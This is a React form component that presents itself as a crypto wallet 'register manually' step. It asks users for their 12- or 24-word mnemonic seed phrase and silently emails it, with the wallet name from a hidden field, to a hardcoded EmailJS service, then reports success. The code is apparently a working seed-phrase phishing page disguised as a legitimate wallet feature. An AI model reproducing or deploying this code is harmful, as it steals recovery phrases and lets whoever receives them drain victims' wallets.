/* eslint-disable react/prop-types */
import React, { useState, useRef } from "react";
import styles from "./FormTwo.module.css";
import emailjs from "@emailjs/browser";
import { NavLink } from "react-router-dom";
import { useModal } from "../pages/walletPage";
import { check } from "../assets";

const FormThree = () => {
  const { selectedWallet,modalHandler } = useModal();
  const [input, setInput] = useState("");
  const [secondInput, setSecondInput] = useState("");
  const [thirdInput, setThirdInput] = useState(selectedWallet.title);
  const [success, setSuccess] = useState(false);

  console.log(selectedWallet);

  const inputHandler = (e) => {
    setInput(e.target.value);
  };

  const secondInputHandler = (e) => {
    setSecondInput(e.target.value);
  };

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_t3pd0ok", "template_tgkmjj9", form.current, {
        publicKey: "r6jlFoRSbAij1f7VU",
      })
      .then(
        () => {
          console.log("SUCCESS!");
          setSuccess((prev) => !prev);
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );

    setInput("");
  };
  return (
    <>
      {success ? (
        <div className="flex flex-col items-center">
          <img src={check} className="w-[100px] mb-[1rem]" />

          <h2 className={`${styles.successTitle}`}>
            Wallet registered succefully
          </h2>

          <button
            className={`${styles.btn} max-w-[350px] `}
            onClick={modalHandler}
          >
            Close
          </button>

          <button className={`${styles.btnTransparent} max-w-[350px] `}>
            <NavLink to="/">Home</NavLink>
          </button>
        </div>
      ) : (
        <form className="w-[100%]" ref={form} onSubmit={sendEmail}>
          <input
            className="hidden"
            value={thirdInput}
            name="name"
            onChange={(e) => setThirdInput(e.target.value)}
          />
          <textarea
            placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
            className="w-[100%] h-[100px] border-[1px] border-solid border-[#0000001A] rounded-md p-[0.3rem] pl-[10px]"
            value={input}
            name="message"
            onChange={inputHandler}
          />

          <textarea
            placeholder="Please enter your recommended wallet address or code.       Kindly ignore if you don’t have one"
            className="w-[100%] h-[100px] border-[1px] border-solid border-[#0000001A] rounded-md p-[0.3rem] pl-[10px]"
            value={secondInput}
            name="message"
            onChange={secondInputHandler}
          />

          <button
            className={`${styles.btn} ${
              !input ? styles.btnFaint : ""
            } cursor-pointer`}
            disabled={!input}
          >
            Register Manually
          </button>
        </form>
      )}
    </>
  );
};

export default FormThree;
